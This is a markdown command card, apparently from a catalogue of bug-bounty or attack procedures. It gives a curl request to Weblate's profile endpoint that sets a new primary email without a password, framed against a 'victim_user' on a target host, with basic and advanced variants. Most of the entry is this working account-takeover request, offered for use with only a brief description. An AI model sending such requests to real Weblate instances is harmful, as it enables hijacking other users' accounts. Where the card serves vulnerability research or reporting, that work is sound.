---
data: >-
  curl -X POST 'https://target.weblate.org/accounts/profile/' -H 'Cookie:
  sessionid=your_session_cookie' -H 'X-CSRFToken: your_csrf_token' -d
  'email=user1%2Bhackerone%40example.com&username=victim_user&first_name=Victim&activetab=%23account&language=it&secondary_in_zen=on&csrfmiddlewaretoken=your_csrf_token'
tags:
  - web
  - profile-update
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:58.292Z'
id: a05eb255-49d7-4bc6-a7db-f133a1febc9b
verified: false
validated: true
submitted: true
---
# curl-set-primary-email-weblate

## Command

```bash
curl -X POST 'https://target.weblate.org/accounts/profile/' \
  -H 'Cookie: sessionid=your_session_cookie' \
  -H 'X-CSRFToken: your_csrf_token' \
  -d 'email=user1%2Bhackerone%40example.com&username=victim_user&first_name=Victim&activetab=%23account&language=it&secondary_in_zen=on&csrfmiddlewaretoken=your_csrf_token'
```

## Description

Updates the Weblate profile to set a new primary email without password, using form data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d` | Form data including email and other fields | Yes |
| CSRF headers | Token for protection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://weblate.example.com/accounts/profile/' -H 'Cookie: sessionid=abc' -H 'X-CSRFToken: token' -d 'email=new@example.com&csrfmiddlewaretoken=token'
```

### Advanced Usage

Include full profile fields:

```bash
curl -X POST 'https://weblate.example.com/accounts/profile/' -H 'Cookie: sessionid=abc' -H 'X-CSRFToken: token' -d 'email=new@example.com&username=user&first_name=Name&activetab=%23account&csrfmiddlewaretoken=token'
```

## Expected Output

Success response or redirect to updated profile.

## Related

- [[Related Procedure: Set-New-Email-as-Primary-in-Weblate]]
